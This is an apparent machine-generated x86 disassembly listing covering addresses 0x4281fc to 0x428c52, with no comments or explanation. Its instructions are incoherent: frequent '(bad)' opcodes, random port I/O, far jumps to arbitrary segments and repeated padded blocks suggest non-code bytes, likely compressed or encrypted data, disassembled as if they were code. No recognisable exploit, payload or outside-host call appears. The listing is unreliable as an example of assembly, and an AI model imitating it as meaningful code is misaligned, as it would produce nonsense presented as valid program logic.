  4281fc:	lock mov ds,WORD PTR [esi]
  4281ff:	add    bh,BYTE PTR [eax+0x10]
  428202:	cmp    eax,0xe62d8237
  428207:	pusha  
  428208:	mov    ecx,0x12f75cfa
  42820d:	enter  0x20e5,0x4f
  428211:	and    al,al
  428213:	(bad)  
  428214:	add    eax,0xca17d30a
  428219:	inc    eax
  42821a:	push   eax
  42821b:	fs popf 
  42821d:	inc    ebp
  42821e:	in     eax,0x98
  428220:	imul   eax,DWORD PTR [esp+ecx*4+0x70],0x4f
  428225:	retf   
  428226:	or     eax,0xf2089566
  42822b:	sub    al,0x54
  42822d:	out    0xad,eax
  42822f:	mov    ch,0x1c
  428231:	pop    ebx
  428232:	sub    al,0x83
  428234:	test   eax,0x1c2cb509
  428239:	mov    ah,BYTE PTR [ebx+0x5e]
  42823c:	sbb    esi,eax
  42823e:	push   cs
  42823f:	mov    al,ds:0xb06d1555
  428244:	cwde   
  428245:	push   ecx
  428246:	sti    
  428247:	mov    ah,0x69
  428249:	icebp  
  42824a:	data16 aaa 
  42824c:	cmp    al,bl
  42824e:	xlat   BYTE PTR ds:[ebx]
  42824f:	addr16 inc edx
  428251:	cdq    
  428252:	lods   eax,DWORD PTR ds:[esi]
  428253:	pushf  
  428254:	jl     0x42822f
  428256:	jbe    0x428294
  428258:	dec    ecx
  428259:	enter  0x5257,0x1b
  42825d:	fisttp DWORD PTR [ebx-0x86bf74]
  428263:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428264:	sbb    ebp,esi
  428266:	xchg   esi,eax
  428267:	into   
  428268:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428269:	imul   ecx,DWORD PTR [ebp+0x3c55f425],0xd099ee0b
  428273:	(bad)
  428276:	fwait
  428277:	shl    DWORD PTR [ebp-0x6],cl
  42827a:	adc    eax,0x3db28874
  42827f:	sbb    al,0x70
  428281:	jbe    0x428256
  428283:	popf   
  428284:	jle    0x428289
  428286:	loop   0x428252
  428288:	pop    esp
  428289:	jp     0x428241
  42828b:	and    BYTE PTR [eax+eiz*1],bl
  42828e:	shl    DWORD PTR [edx+0x0],cl
	...
  4282f1:	add    BYTE PTR [eax],al
  4282f3:	add    bh,al
  4282f5:	fidiv  WORD PTR [esi]
  4282f7:	loop   0x428338
  4282f9:	jmp    0x5c37:0x7b70ffd7
  428300:	lahf   
  428301:	and    ebp,0x1ad3c86
  428307:	add    BYTE PTR [ecx+eax*1],al
  42830a:	add    BYTE PTR [eax],al
  42830c:	addr16 cmc 
  42830e:	mov    edx,0x7fdfe43c
  428313:	mov    ch,0x94
  428315:	test   al,0x25
  428317:	mov    esi,0x28ce369c
  42831c:	sbb    eax,0xff0951d0
  428321:	adc    ecx,ecx
  428323:	mov    ch,0xeb
  428325:	lods   eax,DWORD PTR ds:[esi]
  428326:	mov    cl,0x4a
  428328:	push   edi
  428329:	idiv   DWORD PTR [ebx]
  42832b:	dec    esi
  42832c:	fstp   st(0)
  42832e:	jns    0x428388
  428330:	aaa    
  428331:	das    
  428332:	or     al,0x32
  428334:	in     al,0x1a
  428336:	popf   
  428337:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428338:	scas   al,BYTE PTR es:[edi]
  428339:	mov    ds:0xdb077d73,al
  42833e:	pop    ecx
  42833f:	sub    bl,BYTE PTR fs:[edx]
  428342:	rol    BYTE PTR [edx+0x5e6c71b],1
  428348:	mov    ebp,0xca229cd1
  42834d:	ficomp DWORD PTR [edi-0x4eeaeb4b]
  428353:	scas   al,BYTE PTR es:[edi]
  428354:	or     ah,BYTE PTR [esi-0x4]
  428357:	mov    ch,0x8c
  428359:	push   ss
  42835a:	fbstp  TBYTE PTR [esi]
  42835c:	cmp    eax,0xa75ed306
  428361:	sahf   
  428362:	scas   al,BYTE PTR es:[edi]
  428363:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428364:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428365:	pop    eax
  428366:	popa   
  428367:	retf   0xbbe8
  42836a:	call   0x193e41d1
  42836f:	dec    esi
  428370:	stos   BYTE PTR es:[edi],al
  428371:	jg     0x42834f
  428373:	imul   edx,DWORD PTR [esi-0x50],0x8e9eeba4
  42837a:	sub    ebp,DWORD PTR [ebx]
  42837c:	call   0xff47:0xaecaf769
  428383:	loope  0x428394
  428385:	jo     0x42830b
  428387:	jo     0x4283b4
  428389:	and    al,0x4a
  42838b:	pop    edx
  42838c:	cli    
  42838d:	sub    BYTE PTR [ecx],al
  42838f:	data16 (bad) 
  428392:	or     edi,DWORD PTR [eax+0x2f5b7f23]
  428398:	push   eax
  428399:	fnstcw WORD PTR [edi+0x3b]
  42839c:	cmp    DWORD PTR [ecx],edi
  42839e:	pop    eax
  42839f:	sub    eax,0x73ea948b
  4283a4:	icebp  
  4283a5:	mov    edx,0xb026aa8b
  4283aa:	mov    esp,0xecb93268
  4283af:	clc    
  4283b0:	jge    0x4283b7
  4283b2:	fwait
  4283b3:	jb     0x428412
  4283b5:	ja     0x428369
  4283b7:	loopne 0x428424
  4283b9:	mov    ch,0x8d
  4283bb:	aas    
  4283bc:	push   edx
  4283bd:	ds mov ecx,0x2dfe1a0
  4283c3:	sbb    BYTE PTR [edx],bl
  4283c5:	fisubr WORD PTR [ecx]
  4283c7:	scas   al,BYTE PTR es:[edi]
  4283c8:	cld    
  4283c9:	adc    BYTE PTR [edx+0x13],dl
  4283cc:	ins    BYTE PTR es:[edi],dx
  4283cd:	in     al,dx
  4283ce:	mov    cl,0x28
  4283d0:	fild   QWORD PTR [ebx-0x54]
  4283d3:	xor    DWORD PTR [edi],ebx
  4283d5:	mov    dl,0x79
  4283d7:	mov    ch,BYTE PTR [eax]
  4283d9:	cmp    edx,DWORD PTR [edi+0x2f557228]
  4283df:	dec    ebx
  4283e0:	std    
  4283e1:	push   edi
  4283e2:	push   ebx
  4283e3:	xlat   BYTE PTR ds:[ebx]
  4283e4:	retf   0x1f57
  4283e7:	push   edi
  4283e8:	inc    eax
  4283e9:	aaa    
  4283ea:	pop    ds
  4283eb:	and    BYTE PTR [eax],dh
  4283ed:	imul   BYTE PTR [edi-0x493ce897]
  4283f3:	inc    edi
  4283f4:	jg     0x4283d8
  4283f6:	dec    ebp
  4283f7:	fs dec ebx
  4283f9:	inc    ebp
  4283fa:	hlt    
  4283fb:	test   eax,0x21bf972d
  428400:	push   esi
  428401:	sar    DWORD PTR ds:0x22682054,1
  428407:	sub    al,0x82
  428409:	jnp    0x42838b
  42840b:	sub    eax,0x52f7fd11
	...
  428474:	push   cs
  428475:	xchg   esp,eax
  428476:	jg     0x4284db
  428478:	(bad)  
  428479:	jmp    0x428499
  42847b:	std    
  42847c:	mov    edi,0x2babfb32
  428481:	pop    edi
  428482:	mov    dl,BYTE PTR [ebp+0x1ae40]
  428488:	add    al,0x1
  42848a:	add    BYTE PTR [eax],al
  42848c:	push   edx
  42848d:	(bad)  
  42848e:	pop    ecx
  42848f:	icebp  
  428490:	jge    0x428508
  428492:	adc    dh,dl
  428494:	cmp    BYTE PTR [edi+0x2f],0x46
  428498:	xchg   ecx,eax
  428499:	and    DWORD PTR [esi+0x5d3893f3],ebx
  42849f:	or     ah,BYTE PTR [ebp-0xe]
  4284a2:	mov    eax,0x97dcd82
  4284a7:	jmp    0x7af786cb
  4284ac:	into   
  4284ad:	jmp    0x3c7b:0x22b48c7a
  4284b4:	ret    0xeac
  4284b7:	jge    0x4284d9
  4284b9:	dec    esp
  4284ba:	sub    ebx,esp
  4284bc:	lods   al,BYTE PTR ds:[esi]
  4284bd:	mov    bl,0x80
  4284bf:	hlt    
  4284c0:	retf   0x8063
  4284c3:	mov    bl,0x4a
  4284c5:	jbe    0x4284e2
  4284c7:	lahf   
  4284c8:	popa   
  4284c9:	push   ebp
  4284ca:	add    al,0xb1
  4284cc:	jg     0x4284f9
  4284ce:	lods   al,BYTE PTR es:[esi]
  4284d0:	pusha  
  4284d1:	test   DWORD PTR [ebx],0x6b60e3d3
  4284d7:	pmulhuw mm7,mm1
  4284da:	xor    bh,BYTE PTR [edx-0x31]
  4284dd:	and    al,0x9d
  4284df:	xor    DWORD PTR [ebp-0x2b],eax
  4284e2:	sub    esi,DWORD PTR [esi-0x56498440]
  4284e8:	cmp    BYTE PTR [eax],al
  4284ea:	mov    bh,0x35
  4284ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4284ee:	test   ebp,ebx
  4284f0:	sub    bl,0x61
  4284f3:	mov    dh,0xff
  4284f5:	outs   dx,BYTE PTR ds:[esi]
  4284f6:	fsub   QWORD PTR [eax-0x7238ec96]
  4284fc:	jecxz  0x4284ff
  4284fe:	data16 xlat BYTE PTR ds:[ebx]
  428500:	or     ebx,DWORD PTR [edi]
  428502:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428503:	out    dx,eax
  428504:	arpl   WORD PTR [ecx],bx
  428506:	aam    0x34
  428508:	mov    eax,ds:0xaad21307
  42850d:	mov    bl,0x2a
  42850f:	(bad)
  428512:	mov    ch,0x63
  428514:	or     dl,BYTE PTR ds:0xd3f255f3
  42851a:	bound  eax,QWORD PTR [edi]
  42851c:	aas    
  42851d:	jne    0x428541
  42851f:	push   ecx
  428520:	dec    eax
  428521:	loop   0x4284d7
  428523:	shr    dh,cl
  428525:	test   eax,0x1d6b14dd
  42852a:	add    al,0x2b
  42852c:	jle    0x428572
  42852e:	cmp    DWORD PTR [eax],0x4195336d
  428534:	mov    ds:0x991d6b1f,al
  428539:	rol    DWORD PTR [ebx],0x72
  42853c:	and    ch,BYTE PTR [eax]
  42853e:	in     al,dx
  42853f:	lahf   
  428540:	jnp    0x428506
  428542:	add    eax,0x2db67b55
  428547:	jmp    0xb0f7:0xf51ab3af
  42854e:	out    dx,eax
  42854f:	jbe    0x4284d2
  428551:	or     dh,bl
  428553:	retf   0x94d1
  428556:	sahf   
  428557:	mov    esi,0x5d5d0cf9
  42855c:	in     eax,dx
  42855d:	xor    edi,DWORD PTR [eax]
  42855f:	pop    ebp
  428560:	test   BYTE PTR [edx+0x29],bl
  428563:	pushf  
  428564:	int3   
  428565:	inc    eax
  428566:	in     eax,dx
  428567:	and    ebp,DWORD PTR [ebp+0x58]
  42856a:	out    0x48,eax
  42856c:	and    DWORD PTR [ecx-0x46f7f467],esi
  428572:	in     eax,0x22
  428574:	test   al,0x54
  428576:	(bad)  
  428577:	aam    0x2d
  428579:	xor    esi,eax
  42857b:	xchg   BYTE PTR [ecx],cl
  42857d:	call   0x1496:0x414ac509
  428584:	dec    ebx
  428585:	jne    0x428516
  428587:	mov    ecx,0xd239e1f4
  42858c:	fcomi  st,st(3)
  42858e:	mov    esp,0xc8
	...
  4285f3:	add    BYTE PTR [ecx-0xa],dl
  4285f6:	xor    eax,0x5bffb73e
  4285fb:	inc    edi
  4285fd:	mov    esi,0x48fba3f6
  428602:	cmp    BYTE PTR [esp+eax*2],dl
  428605:	scas   eax,DWORD PTR es:[edi]
  428606:	add    DWORD PTR [eax],eax
  428608:	add    al,0x1
  42860a:	add    BYTE PTR [eax],al
  42860c:	lahf   
  42860d:	inc    ecx
  42860e:	xchg   ebp,eax
  42860f:	cmp    ebx,ebx
  428611:	or     bh,BYTE PTR [edx+ebp*8]
  428614:	jmp    0x8671:0xadc130d3
  42861b:	ficom  WORD PTR [edx+edi*1+0x6b]
  42861f:	adc    al,0xe1
  428621:	or     dl,BYTE PTR [ebx-0x3a]
  428624:	mov    DWORD PTR [ecx-0x31df0db6],ebx
  42862a:	fs mov ch,0x7f
  42862d:	cld    
  42862e:	push   esi
  42862f:	pop    ecx
  428630:	and    DWORD PTR ds:0xc03f6d94,ecx
  428636:	shl    DWORD PTR [esi],cl
  428638:	in     al,dx
  428639:	xchg   BYTE PTR [ebx-0x42],bl
  42863c:	in     al,dx
  42863d:	arpl   di,bp
  42863f:	cmc    
  428640:	fidivr DWORD PTR [ecx]
  428642:	out    0x27,eax
  428644:	jl     0x4286c4
  428646:	adc    DWORD PTR [eax],ecx
  428648:	sub    BYTE PTR [ebx+0x72],dh
  42864b:	pop    ebp
  42864c:	jg     0x42861f
  42864e:	mov    eax,0xa3017c54
  428653:	ficom  DWORD PTR [edi]
  428655:	sbb    BYTE PTR [ecx-0x7f189fa7],ah
  42865b:	loop   0x428679
  42865d:	push   esp
  42865e:	outs   dx,DWORD PTR ds:[esi]
  42865f:	push   0x123ac751
  428664:	fs mov esi,0xb8d3878f
  42866a:	out    dx,eax
  42866b:	sahf   
  42866c:	xchg   ecx,eax
  42866d:	jge    0x4286dd
  42866f:	lods   eax,DWORD PTR ds:[esi]
  428670:	mov    ch,0x5c
  428672:	data16 mov bh,0x4a
  428675:	xor    al,0x33
  428677:	enter  0xc1d3,0x91
  42867b:	push   edx
  42867c:	xlat   BYTE PTR ds:[ebx]
  42867d:	int3   
  42867e:	lahf   
  42867f:	int3   
  428680:	or     BYTE PTR [ebx+0x1b7a0ce1],bl
  428686:	gs and al,0x4e
  428689:	xor    eax,0x35e3fc8f
  42868e:	jns    0x428653
  428690:	dec    edx
  428691:	dec    ebp
  428692:	(bad)  
  428693:	out    0x53,al
  428695:	mov    esp,0x29af4cc5
  42869a:	gs into 
  42869c:	(bad)  
  42869d:	fimul  DWORD PTR [ebp-0x27]
  4286a0:	into   
  4286a1:	pop    esi
  4286a2:	push   edi
  4286a3:	adc    DWORD PTR [edx+0x14302b34],ebp
  4286a9:	mov    ch,0xfd
  4286ab:	adc    al,0xce
  4286ad:	imul   esi,DWORD PTR [ebp-0x2d40dc6d],0xb66d3ad2
  4286b7:	sbb    al,0x12
  4286b9:	std    
  4286ba:	and    BYTE PTR [eax+0x2c62a510],0x93
  4286c1:	imul   ebp,ebx,0x6ee24345
  4286c7:	pop    ds
  4286c8:	and    eax,0x7236e9f3
  4286cd:	jae    0x428666
  4286cf:	adc    cl,bl
  4286d1:	cld    
  4286d2:	test   BYTE PTR [ecx+0x28cae356],dl
  4286d8:	cmc    
  4286d9:	sbb    ebp,ebp
  4286db:	jle    0x4286d5
  4286dd:	xor    DWORD PTR [esi+0x14],ecx
  4286e0:	repz jmp 0x8783621b
  4286e6:	pop    ecx
  4286e7:	in     al,dx
  4286e8:	ret    
  4286e9:	jecxz  0x4286f5
  4286eb:	inc    esp
  4286ec:	out    0x40,eax
  4286ee:	push   esp
  4286ef:	xchg   DWORD PTR [esi+eax*2+0x52ca49c2],ebp
  4286f6:	dec    ebx
  4286f7:	scas   eax,DWORD PTR es:[edi]
  4286f8:	sbb    cl,dh
  4286fa:	int3   
  4286fb:	sbb    al,0x20
  4286fd:	scas   al,BYTE PTR es:[edi]
  4286fe:	inc    ecx
  4286ff:	test   BYTE PTR [eax],0xd8
  428702:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428703:	mov    edx,0x8d61c34f
  428708:	sub    esi,DWORD PTR [eax+0x24]
  42870b:	pushf  
  42870c:	cmp    DWORD PTR [ebx+0xec98],esi
	...
  428772:	add    BYTE PTR [eax],al
  428774:	push   esi
  428775:	pop    ebx
  428776:	xor    al,0x78
  428778:	cmp    eax,0xe77f5e7f
  42877d:	inc    ebp
  42877e:	call   0x875e7b96
  428783:	sbb    ecx,DWORD PTR [eax-0x50]
  428786:	add    DWORD PTR [eax],eax
  428788:	add    al,0x1
  42878a:	add    BYTE PTR [eax],al
  42878c:	add    esp,DWORD PTR [ebp-0x1ba589d3]
  428792:	sbb    eax,0xd0a3abec
  428797:	test   eax,0x8fe9fae3
  42879c:	push   cs
  42879d:	jle    0x42875c
  42879f:	mov    ah,BYTE PTR ds:0x5f717218
  4287a5:	jb     0x42879d
  4287a7:	popa   
  4287a8:	sbb    cl,bl
  4287aa:	pop    ds
  4287ab:	pop    eax
  4287ac:	or     dh,bl
  4287ae:	mov    edx,eax
  4287b0:	aaa    
  4287b1:	cdq    
  4287b2:	dec    edx
  4287b3:	in     al,0x3f
  4287b5:	or     al,0xa9
  4287b7:	rcl    ecx,cl
  4287b9:	dec    ebp
  4287ba:	inc    eax
  4287bb:	(bad)  
  4287bc:	sub    al,0x21
  4287be:	scas   eax,DWORD PTR es:[edi]
  4287bf:	xlat   BYTE PTR ds:[ebx]
  4287c0:	lods   eax,DWORD PTR ds:[esi]
  4287c1:	bound  edi,QWORD PTR [ebx+0xd]
  4287c4:	mov    dh,0xdc
  4287c6:	or     ch,BYTE PTR [ebp-0x9a69ba6]
  4287cc:	outs   dx,BYTE PTR ds:[esi]
  4287cd:	out    0x23,al
  4287cf:	call   0x226e8898
  4287d4:	xchg   esi,eax
  4287d5:	fisttp QWORD PTR [ebx+0x75]
  4287d8:	(bad)  
  4287d9:	outs   dx,DWORD PTR ds:[esi]
  4287da:	fnstcw WORD PTR [ebx+0x6a]
  4287dd:	(bad)
  4287e0:	out    0x60,al
  4287e2:	pop    ds
  4287e3:	xor    BYTE PTR ss:[eax+0x42],dl
  4287e7:	sub    eax,DWORD PTR [esp+ebx*2-0x1d]
  4287eb:	int    0x50
  4287ed:	ret    
  4287ee:	dec    ebx
  4287ef:	push   eax
  4287f0:	test   BYTE PTR [ebx],al
  4287f2:	fwait
  4287f3:	jne    0x428796
  4287f5:	jp     0x4287f0
  4287f7:	test   BYTE PTR [esi-0x40],bh
  4287fa:	mov    edi,0x906d5b2f
  4287ff:	aad    0x9b
  428801:	sbb    BYTE PTR [ebx-0xd],cl
  428804:	scas   al,BYTE PTR es:[edi]
  428805:	out    0xd0,al
  428807:	push   edi
  428808:	in     eax,dx
  428809:	xchg   edi,eax
  42880a:	add    ebp,eax
  42880c:	sahf   
  42880d:	jne    0x4287f3
  42880f:	(bad)  
  428810:	in     eax,dx
  428811:	shl    BYTE PTR [esi+eiz*1],cl
  428814:	add    al,0xb0
  428816:	mov    edi,0x65f2d33b
  42881b:	in     eax,dx
  42881c:	xor    al,0xa1
  42881e:	(bad)  
  428820:	lds    ecx,FWORD PTR [edx]
  428822:	lods   eax,DWORD PTR ds:[esi]
  428823:	xchg   ebx,eax
  428824:	icebp  
  428825:	popa   
  428826:	cmp    esi,DWORD PTR [ecx-0x34cedd9b]
  42882c:	jbe    0x428878
  42882e:	frstor [eax-0x46f42de7]
  428834:	mov    ebp,0xd518d304
  428839:	xor    edi,DWORD PTR [ecx+0x14a28ce7]
  42883f:	mov    ah,0xd9
  428841:	pop    edi
  428842:	fld    DWORD PTR [ebx-0x13]
  428845:	arpl   ax,dx
  428847:	xchg   edi,eax
  428848:	out    dx,al
  428849:	fwait
  42884a:	bnd jg 0x4288a2
  42884d:	mov    bl,0xa4
  42884f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428850:	mov    cl,dh
  428852:	rol    BYTE PTR [ebp-0x326007e0],0xa1
  428859:	and    al,0x97
  42885b:	mov    bl,0x40
  42885d:	pop    esp
  42885e:	mov    ds:0xdec3a389,al
  428863:	dec    edi
  428864:	mul    ecx
  428866:	stos   BYTE PTR es:[edi],al
  428867:	adc    bh,BYTE PTR [eax+0x2038ab1c]
  42886d:	push   ss
  42886e:	dec    esp
  42886f:	int3   
  428870:	(bad)  [ecx]
  428872:	pop    ebx
  428873:	jmp    0xea30:0x7f44c0bf
  42887a:	imul   esi,DWORD PTR [esi+0x30],0x1b
  42887e:	cmc    
  42887f:	icebp  
  428880:	mov    bh,0x1e
  428882:	jne    0x42889a
  428884:	sahf   
  428885:	sbb    eax,0x103eb894
  42888a:	or     DWORD PTR [edi],ebx
  42888c:	repnz mov bh,0xf2
  42888f:	sub    BYTE PTR [eax],al
	...
  4288f1:	add    BYTE PTR [eax],al
  4288f3:	add    BYTE PTR [esi],ah
  4288f5:	jp     0x428968
  4288f7:	les    edi,FWORD PTR [ebp-0x31]
  4288fa:	mov    bh,0xfa
  4288fc:	arpl   WORD PTR [esi-0xe9762f1],bx
  428902:	jo     0x4288bc
  428904:	dec    esp
  428905:	mov    cl,0x1
  428907:	add    BYTE PTR [ecx+eax*1],al
  42890a:	add    BYTE PTR [eax],al
  42890c:	and    dh,BYTE PTR ds:0x2533939b
  428912:	xchg   DWORD PTR [ebx-0x1b],eax
  428915:	adc    edx,DWORD PTR [edx]
  428917:	test   al,0xa3
  428919:	es enter 0x65cb,0xff
  42891e:	fld    DWORD PTR [ecx-0x68]
  428921:	jp     0x4288ad
  428923:	pop    es
  428924:	pop    ss
  428925:	sbb    esp,DWORD PTR [edi]
  428927:	dec    esp
  428928:	dec    esi
  428929:	and    edx,DWORD PTR [esi]
  42892b:	retf   
  42892c:	in     eax,0x18
  42892e:	jle    0x428932
  428930:	mov    cl,0xf9
  428932:	jmp    0xf28c45d2
  428937:	xchg   edi,eax
  428938:	bound  ebp,QWORD PTR [ebx]
  42893a:	adc    al,0xb2
  42893c:	repnz mov dh,0x49
  42893f:	adc    al,cl
  428941:	test   bl,dh
  428943:	lahf   
  428944:	push   ds
  428945:	sbb    ecx,edx
  428947:	lea    ebp,[edx-0x784deb9e]
  42894d:	inc    esi
  42894e:	data16 rep ins BYTE PTR es:[edi],dx
  428951:	sbb    al,0x6f
  428953:	js     0x4288f2
  428955:	fsub   st,st(4)
  428957:	mov    edx,0x6c5f8e4e
  42895c:	or     al,0x91
  42895e:	mov    eax,0x3c11faa1
  428963:	sub    DWORD PTR [edi+edx*8-0x27],0x50
  428968:	cmp    ebp,ebp
  42896a:	inc    esp
  42896b:	push   cs
  42896c:	in     eax,dx
  42896d:	push   es
  42896e:	cmp    esi,DWORD PTR [esi-0x10]
  428971:	call   0xe991fe0
  428976:	cld    
  428977:	jb     0x428974
  428979:	popf   
  42897a:	int    0xca
  42897c:	movsx  edi,WORD PTR cs:0x3aaab69
  428984:	inc    ebp
  428985:	cmp    al,0x64
  428987:	stc    
  428988:	dec    esp
  428989:	push   esp
  42898a:	addr16 jmp 0xa9ce2246
  428990:	mov    edi,ecx
  428992:	jle    0x42897a
  428994:	(bad)  
  428995:	in     eax,0x3e
  428997:	cwde   
  428998:	sbb    bl,al
  42899a:	nop
  42899b:	rol    DWORD PTR [esi],0xd0
  42899e:	ins    DWORD PTR es:[edi],dx
  42899f:	cmc    
  4289a0:	mov    esi,0x42c77c8f
  4289a5:	call   0xfbb9:0x8e0b2b94
  4289ac:	cmp    al,0xde
  4289ae:	iret   
  4289af:	stc    
  4289b0:	pop    esi
  4289b1:	pop    edi
  4289b2:	add    ch,dl
  4289b4:	push   0xec917ece
  4289b9:	adc    al,0xc9
  4289bb:	scas   al,BYTE PTR es:[edi]
  4289bc:	cmp    eax,0x5156839e
  4289c1:	cs jno 0x4289ee
  4289c4:	ja     0x42897f
  4289c6:	sub    edx,0x10f544cb
  4289cc:	jp     0x4289c7
  4289ce:	fcomp  DWORD PTR [ecx-0x6e3b3781]
  4289d4:	sbb    cl,bl
  4289d6:	aaa    
  4289d7:	call   0x7887f09a
  4289dc:	neg    DWORD PTR [edx]
  4289de:	xchg   ebp,eax
  4289df:	in     eax,dx
  4289e0:	mov    ds,WORD PTR [ecx]
  4289e2:	iret   
  4289e3:	jp     0x4289bb
  4289e5:	fild   WORD PTR [ecx-0x1c]
  4289e8:	mov    edi,0x491b3ebf
  4289ed:	inc    esp
  4289ee:	fimul  WORD PTR [edx-0x653c9c3f]
  4289f4:	ror    dl,cl
  4289f6:	and    BYTE PTR [eax],bh
  4289f8:	cmovno ecx,DWORD PTR [edi-0x7d]
  4289fc:	mov    edi,eax
  4289fe:	arpl   WORD PTR [ebx-0x1cc235ec],bp
  428a04:	(bad)  
  428a07:	lds    esi,FWORD PTR [edx+edx*8+0x31]
  428a0b:	sti    
  428a0c:	mov    edi,0xbe6204
	...
  428a71:	add    BYTE PTR [eax],al
  428a73:	add    BYTE PTR [ebp+0xc],cl
  428a76:	clc    
  428a77:	pop    ebx
  428a78:	stc    
  428a79:	(bad)  
  428a7a:	out    dx,eax
  428a7b:	push   ds
  428a7c:	pop    ds
  428a7d:	bound  edx,QWORD PTR [eax-0x2606c7ed]
  428a83:	cdq    
  428a84:	push   eax
  428a85:	mov    dl,0x1
  428a87:	add    BYTE PTR [ecx+eax*1],al
  428a8a:	add    BYTE PTR [eax],al
  428a8c:	adc    al,0x57
  428a8e:	sub    DWORD PTR [edi+eiz*2],ecx
  428a91:	icebp  
  428a92:	add    DWORD PTR [edx],ecx
  428a94:	test   ebp,0xbc3b8ae5
  428a9a:	das    
  428a9b:	loope  0x428a1e
  428a9d:	retf   0xa5c7
  428aa0:	push   es
  428aa1:	int    0x6e
  428aa3:	rcr    BYTE PTR [eax+0x14],0xf7
  428aa7:	inc    ecx
  428aa8:	scas   eax,DWORD PTR es:[edi]
  428aa9:	cwde   
  428aaa:	xor    DWORD PTR ds:0x9d86b458,ebx
  428ab0:	sub    DWORD PTR [ebx],esi
  428ab2:	int3   
  428ab3:	(bad)  
  428ab4:	js     0x428b0d
  428ab6:	hlt    
  428ab7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428ab8:	jns    0x428a75
  428aba:	imul   esp,DWORD PTR [edi+0x6e],0x7095cc67
  428ac1:	test   BYTE PTR [ebx+0x4a],0x6c
  428ac5:	scas   eax,DWORD PTR es:[edi]
  428ac6:	add    eax,0xbc8da0fd
  428acb:	push   ebp
  428acc:	or     al,0x8f
  428ace:	push   edx
  428acf:	adc    ebx,esp
  428ad1:	fiadd  WORD PTR [ebp+0x4f7df716]
  428ad7:	and    BYTE PTR [edx+ebx*1-0x320f6491],dh
  428ade:	jns    0x428a81
  428ae0:	or     BYTE PTR [ecx+0x5d],dh
  428ae3:	xchg   ecx,eax
  428ae4:	inc    ecx
  428ae5:	sti    
  428ae6:	fstp   TBYTE PTR [esp+ecx*8+0x34cedf75]
  428aed:	jl     0x428a87
  428aef:	stc    
  428af0:	xchg   ecx,eax
  428af1:	jl     0x428b35
  428af3:	mov    ss,ebp
  428af5:	push   eax
  428af6:	mov    bl,0xae
  428af8:	(bad)  
  428af9:	iret   
  428afa:	sub    eax,DWORD PTR [edi+0x4e]
  428afd:	rcr    DWORD PTR ss:[esi+0x4c7b7224],1
  428b04:	in     ax,dx
  428b06:	jle    0x428b7b
  428b08:	xor    al,0x9f
  428b0a:	cld    
  428b0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428b0c:	xchg   ecx,eax
  428b0d:	fiadd  DWORD PTR [esi+edi*2-0x64]
  428b11:	dec    ebx
  428b12:	pop    es
  428b13:	jae    0x428b51
  428b15:	mov    WORD PTR [ebp+0x20],ss
  428b18:	adc    eax,0xf90a9900
  428b1d:	push   cs
  428b1e:	jle    0x428adf
  428b20:	jmp    0xd24e08ad
  428b25:	mov    ebp,0xf26948eb
  428b2a:	inc    ecx
  428b2b:	push   cs
  428b2c:	jecxz  0x428bad
  428b2e:	loop   0x428b2f
  428b30:	and    DWORD PTR [ebp-0x43],edi
  428b33:	and    BYTE PTR [ebx],0xe8
  428b36:	(bad)  
  428b37:	xor    eax,ebx
  428b39:	lds    ebp,FWORD PTR [esi]
  428b3b:	mov    edx,0x811407f6
  428b40:	or     al,0x6e
  428b42:	lahf   
  428b43:	test   BYTE PTR [ebp-0x64],dh
  428b46:	sbb    bh,BYTE PTR [esi-0x3b9baac6]
  428b4c:	es stos WORD PTR es:[edi],ax
  428b4f:	sub    esp,edx
  428b51:	test   BYTE PTR [ebp-0x76],ah
  428b54:	cmp    ebx,DWORD PTR [ecx]
  428b56:	xchg   edi,eax
  428b57:	xchg   bl,dl
  428b59:	sahf   
  428b5a:	fs push eax
  428b5c:	mov    al,ds:0xb4015dae
  428b61:	jb     0x428b9d
  428b63:	fsubr  QWORD PTR cs:[eax]
  428b66:	and    esp,esp
  428b68:	pop    eax
  428b69:	popa   
  428b6a:	inc    esi
  428b6b:	push   edi
  428b6c:	aad    0xf6
  428b6e:	bound  ebp,QWORD PTR [edx-0x3d891439]
  428b74:	rcr    BYTE PTR [edx+0x29],cl
  428b77:	scas   eax,DWORD PTR es:[edi]
  428b78:	clc    
  428b79:	sub    DWORD PTR [ebp+ebp*2+0x18],ecx
  428b7d:	xor    eax,0x46ee285
  428b82:	stc    
  428b83:	adc    eax,0x1367f46d
  428b88:	cmp    eax,0x4bc2b32f
  428b8d:	jg     0x428bf5
  428b8f:	in     al,0x0
	...
  428bf1:	add    BYTE PTR [eax],al
  428bf3:	add    ch,al
  428bf5:	push   ebp
  428bf6:	mov    bh,dl
  428bf8:	call   0xbbc:0x947ff5ff
  428bff:	push   0x1597002
  428c04:	push   esp
  428c05:	mov    bl,0x1
  428c07:	add    BYTE PTR [ecx+eax*1],al
  428c0a:	add    BYTE PTR [eax],al
  428c0c:	cs aad 0x96
  428c0f:	xor    eax,0x4f32f2cd
  428c14:	push   esi
  428c15:	sbb    esi,ebx
  428c17:	pop    ebp
  428c18:	stos   BYTE PTR es:[edi],al
  428c19:	ja     0x428c1b
  428c1b:	getsec 
  428c1d:	(bad)  
  428c1e:	or     ecx,edx
  428c20:	sub    al,0x6e
  428c22:	sbb    dh,bh
  428c24:	nop
  428c25:	popa   
  428c26:	pop    ecx
  428c27:	arpl   sp,di
  428c29:	adc    eax,0x76edbfb4
  428c2e:	fs leave 
  428c30:	(bad)
  428c35:	jb     0x428c3c
  428c37:	xor    DWORD PTR [ecx+0x16c02ff1],ebx
  428c3d:	jo     0x428bfa
  428c3f:	cmp    ebp,esi
  428c41:	das    
  428c42:	cmp    al,0x4e
  428c44:	rol    esp,1
  428c46:	fwait
  428c47:	pusha  
  428c48:	imul   edi,DWORD PTR [ecx],0xffffffb6
  428c4b:	scas   eax,DWORD PTR es:[edi]
  428c4c:	arpl   dx,dx
  428c4e:	int    0x84
  428c50:	cwde   
  428c51:	push   ebx
  428c52:	repnz add edi,DWORD PTR [edi+0x6e]
